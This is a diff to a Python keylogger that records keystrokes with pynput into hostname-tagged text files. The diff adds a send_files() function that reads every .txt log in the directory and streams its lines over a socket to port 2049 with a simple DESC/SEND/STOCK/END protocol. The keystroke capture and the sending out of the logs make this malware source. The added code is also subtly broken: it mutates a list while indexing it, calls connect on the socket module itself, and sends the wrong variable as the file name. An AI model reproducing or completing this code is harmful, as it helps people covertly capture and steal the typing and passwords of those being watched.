@@ -1,6 +1,7 @@
 import socket
 from pynput import keyboard
 import datetime
+import os
 
 namefile = datetime.datetime.now().strftime("%I %M%p on %B %d %Y") +"_" + socket.gethostname() + ".txt"
 f = open(namefile, "w+")
@@ -114,6 +115,39 @@ def on_press(key):
     if '{0}'.format(key)=='Key.shift' :
         shift = True
         caps ^= True
+
+
+def send_files():
+    global liste, socket
+
+    # Lists all the .txt files in the directory
+    liste = os.listdir(".")
+    for i in range(len(liste)):
+        if liste[i].find(".txt") == -1:
+            del liste[i]
+    socket.connect(("localhost", 2049))
+
+    # For every .txt file
+    for text_file in liste:
+        text_lines = []
+
+        # Reads the lines of that file
+        with open(text_file, "r") as ins:
+            for line in ins:
+                text_lines.append(line)
+
+        # Send the name of the file
+        socket.send(("DESC "+line+"\n").encode("latin1"))
+
+        # Sends each lines registered in text_lines
+        for line in text_lines:
+            socket.send(("SEND {}\n".format(line)).encode("latin1"))
+
+        # Save that file and goes to the next one
+        socket.send("STOCK\n".encode("latin1"))
+
+    socket.send("END\n".encode("latin1"))
+    socket.close()
 
 
 def send_list():
